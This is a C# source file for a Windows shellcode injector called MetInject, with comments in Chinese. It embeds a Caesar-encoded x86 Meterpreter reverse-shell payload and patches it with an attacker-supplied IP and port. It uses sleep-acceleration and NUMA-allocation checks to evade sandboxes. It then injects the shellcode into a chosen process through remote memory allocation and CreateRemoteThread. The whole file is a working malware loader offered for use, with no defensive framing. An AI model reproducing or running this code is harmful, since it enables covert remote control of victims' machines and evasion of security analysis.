using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;

namespace MetInject
{
    class Program
    {
        // -------- 内存分配 / 反沙箱 API --------
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        // -------- 远程进程注入 API --------
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            Console.WriteLine("[*] MetInject (x86) started");

            // 参数解析：IP 端口 目标进程名
            if (args.Length < 3)
            {
                Console.WriteLine("[-] Usage: MetInject.exe <IP> <Port> <TargetProcess>");
                return;
            }

            if (!IPAddress.TryParse(args[0], out IPAddress ip))
            {
                Console.WriteLine("[-] Invalid IP address");
                return;
            }
            if (!int.TryParse(args[1], out int port) || port < 1 || port > 65535)
            {
                Console.WriteLine("[-] Invalid port");
                return;
            }
            string targetProcess = args[2];

            Console.WriteLine("[*] Target: {0}:{1} -> process '{2}'", ip, port, targetProcess);

            // -------- 反沙箱1：睡眠加速检测 --------
            Console.WriteLine("[*] Sleeping 5 seconds (anti-sandbox)...");
            var t1 = DateTime.Now;
            Sleep(5000);
            double elapsed = (DateTime.Now - t1).TotalSeconds;
            Console.WriteLine("[*] Actual sleep: {0:F2}s", elapsed);
            if (elapsed < 4.5)
            {
                Console.WriteLine("[-] Sleep accelerated, exiting.");
                return;
            }

            // -------- 反沙箱2：NUMA 内存分配检测 --------
            Console.WriteLine("[*] Testing NUMA allocation...");
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                Console.WriteLine("[-] NUMA alloc failed, possible sandbox.");
                return;
            }
            Console.WriteLine("[+] NUMA alloc succeeded");

            // -------- x86 凯撒+5 加密的 Meterpreter 载荷 --------
            byte[] enc = {0x01,0xed,0x94,0x05,0x05,0x05,0x65,0x36,0xd7,0x8e,0xea,0x69,0x90,0x57,0x35,0x90,0x57,0x11,0x90,0x57,0x19,0x90,0x77,0x2d,0x36,0x04,0x14,0xbc,0x4f,0x2b,0x36,0xc5,0xb1,0x41,0x66,0x81,0x07,0x31,0x25,0xc6,0xd4,0x12,0x06,0xcc,0x4e,0x7a,0xf4,0x57,0x90,0x57,0x15,0x5c,0x90,0x47,0x41,0x06,0xd5,0x90,0x45,0x7d,0x8a,0xc5,0x79,0x51,0x06,0xd5,0x90,0x4d,0x1d,0x90,0x5d,0x25,0x55,0x06,0xd8,0x8a,0xce,0x79,0x41,0x36,0x04,0x4e,0x90,0x39,0x90,0x06,0xdb,0x36,0xc5,0xb1,0xc6,0xd4,0x12,0x06,0xcc,0x3d,0xe5,0x7a,0xf9,0x08,0x82,0xfd,0x40,0x82,0x29,0x7a,0xe5,0x5d,0x90,0x5d,0x29,0x06,0xd8,0x6b,0x90,0x11,0x50,0x90,0x5d,0x21,0x06,0xd8,0x90,0x09,0x90,0x06,0xd5,0x8e,0x49,0x29,0x29,0x60,0x60,0x66,0x5e,0x5f,0x56,0x04,0xe5,0x5d,0x64,0x5f,0x90,0x17,0xee,0x85,0x04,0x04,0x04,0x62,0x6d,0x38,0x37,0x05,0x05,0x6d,0x7c,0x78,0x37,0x64,0x59,0x6d,0x51,0x7c,0x2b,0x0c,0x8e,0xed,0x04,0xd5,0xbd,0x95,0x06,0x05,0x05,0x2e,0xc9,0x59,0x55,0x6d,0x2e,0x85,0x70,0x05,0x04,0xda,0x6f,0x0f,0x6d,0x16,0x16,0x16,0x16,0x6d,0x07,0x05,0x27,0x27,0x8e,0xeb,0x55,0x55,0x55,0x55,0x45,0x55,0x45,0x55,0x6d,0xef,0x14,0xe4,0xe5,0x04,0xda,0x9c,0x6f,0x15,0x5b,0x5c,0x6d,0x9e,0xaa,0x79,0x66,0x04,0xda,0x8a,0xc5,0x79,0x0f,0x04,0x53,0x0d,0x7a,0xf1,0xed,0x6c,0x05,0x05,0x05,0x6f,0x05,0x6f,0x09,0x5b,0x5c,0x6d,0x07,0xde,0xcd,0x64,0x04,0xda,0x88,0xfd,0x05,0x83,0x3b,0x90,0x3b,0x6f,0x45,0x6d,0x05,0x15,0x05,0x05,0x5b,0x6f,0x05,0x6d,0x5d,0xa9,0x58,0xea,0x04,0xda,0x98,0x58,0x6f,0x05,0x5b,0x58,0x5c,0x6d,0x07,0xde,0xcd,0x64,0x04,0xda,0x88,0xfd,0x05,0x82,0x2d,0x5d,0x6d,0x05,0x45,0x05,0x05,0x6f,0x05,0x55,0x6d,0x10,0x34,0x14,0x35,0x04,0xda,0x5c,0x6d,0x7a,0x73,0x52,0x66,0x04,0xda,0x63,0x63,0x04,0x11,0x29,0x14,0x8a,0x75,0x04,0x04,0x04,0xee,0xa0,0x04,0x04,0x04,0x06,0xc8,0x2e,0xcb,0x7a,0xc6,0xc8,0xc0,0xf5,0xba,0xa7,0x5b,0x6f,0x05,0x58,0x04,0xda};
            Console.WriteLine("[*] Encrypted payload: {0} bytes", enc.Length);

            // 凯撒-5 解密
            byte[] buf = new byte[enc.Length];
            for (int i = 0; i < buf.Length; i++)
                buf[i] = (byte)(((uint)enc[i] - 5) & 0xFF);

            // 定位 sockaddr 结构：AF_INET (0x02,0x00) + 占位端口 (0x22,0x22)
            byte[] pattern = { 0x02, 0x00, 0x22, 0x22 };
            int pos = FindBytes(buf, pattern);
            if (pos == -1)
            {
                Console.WriteLine("[-] Sockaddr pattern not found!");
                return;
            }
            int portOffset = pos + 2;   // 端口占位符起始
            int ipOffset   = pos - 5;   // x86 下 IP 在结构中的偏移（特殊定位）
            Console.WriteLine("[*] Pattern at offset {0}, port offset {1}, ip offset {2}", pos, portOffset, ipOffset);

            // 替换端口（大端）
            buf[portOffset]   = (byte)((port >> 8) & 0xFF);
            buf[portOffset+1] = (byte)(port & 0xFF);

            // 替换 IP（大端）
            byte[] ipBytes = ip.GetAddressBytes();
            Buffer.BlockCopy(ipBytes, 0, buf, ipOffset, 4);

            Console.WriteLine("[*] Injected IP: {0}.{1}.{2}.{3}",
                buf[ipOffset], buf[ipOffset+1], buf[ipOffset+2], buf[ipOffset+3]);
            Console.WriteLine("[*] Injected Port: {0} (0x{1:X2}{2:X2})",
                port, buf[portOffset], buf[portOffset+1]);

            // -------- 查找目标进程 PID --------
            Process[] procs = Process.GetProcessesByName(targetProcess);
            if (procs.Length == 0)
            {
                Console.WriteLine("[-] Process '{0}' not found.", targetProcess);
                return;
            }
            int pid = procs[0].Id;
            Console.WriteLine("[+] Found process '{0}' (PID: {1})", targetProcess, pid);

            // 打开目标进程（完全访问权限）
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] OpenProcess failed. Error: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Opened target process handle: 0x{0:X}", hProcess);

            // 在远程进程中分配可执行内存
            IntPtr remoteAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            if (remoteAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAllocEx failed. Error: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Memory allocated in remote process at 0x{0:X}", remoteAddr);

            // 写入 shellcode
            IntPtr bytesWritten;
            bool writeOk = WriteProcessMemory(hProcess, remoteAddr, buf, (uint)buf.Length, out bytesWritten);
            if (!writeOk)
            {
                Console.WriteLine("[-] WriteProcessMemory failed. Error: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Shellcode written ({0} bytes)", (int)bytesWritten);

            // 创建远程线程执行
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] CreateRemoteThread failed. Error: {0}", Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Remote thread created. Handle: 0x{0:X}", hThread);
            Console.WriteLine("[*] Shellcode is now executing inside '{0}' (PID {1})", targetProcess, pid);
        }

        // 字节序列查找函数（与 x64 版本一致）
        static int FindBytes(byte[] src, byte[] pat)
        {
            for (int i = 0; i <= src.Length - pat.Length; i++)
            {
                bool ok = true;
                for (int j = 0; j < pat.Length; j++)
                    if (src[i + j] != pat[j]) { ok = false; break; }
                if (ok) return i;
            }
            return -1;
        }
    }
}